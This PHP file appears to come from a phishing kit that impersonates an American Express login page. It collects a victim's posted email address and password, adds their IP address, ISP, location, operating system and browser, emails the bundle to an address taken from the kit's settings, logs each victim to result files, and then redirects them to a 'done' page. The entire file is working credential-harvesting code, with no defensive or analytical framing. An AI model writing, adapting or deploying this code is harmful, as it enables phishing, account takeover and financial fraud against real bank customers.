<?php
error_reporting(0);
session_start();
require_once '../main.php';
require_once 'session.php';
if($_POST['emailaddress'] == "") {
	exit();
}
$ip = getUserIP(); 
$message  = "#--------------------[ AMEX LOGIN ]-------------------------#\n";
$message .= "User ID		: ".$_POST['emailaddress']."\n";
$message .= "Password		: ".$_POST['emailpassword']."\n";
$message .= "#--------------------------[ PC INFORMATION ]-------------------------#\n";
$message .= "IP Address		: ".$ip."\n";
$message .= "ISP		    : ".$ispuser."\n";
$message .= "Region		    : ".$regioncity."\n";
$message .= "City		    : ".$citykota."\n";
$message .= "Continent		: ".$continent."\n";
$message .= "Timezone		: ".$timezone."\n";
$message .= "OS/Browser		: ".$os." / ".$br."\n";
$message .= "Date			: ".$date."\n";
$message .= "User Agent		: ".$user_agent."\n";
$message .= "#--------------------------[ PRIVATE ]-----------------------------#\n";
$subject = "TEMBUS EMAIL: ".$_POST['emailaddress']." [ $cn - $os - $ip ]";
kirim_mail($setting['email_result'], "Amex Email", $subject, $message);
tulis_file("../result/total_email.txt", $ip);
tulis_file("../result/log_visitor.txt", "[$time - $ip - $countryname - $br - $os] Mengisi Email");
echo "<script type='text/javascript'>window.top.location='done?request_type=LogonHandler&Face=en_US&key=$key';</script>";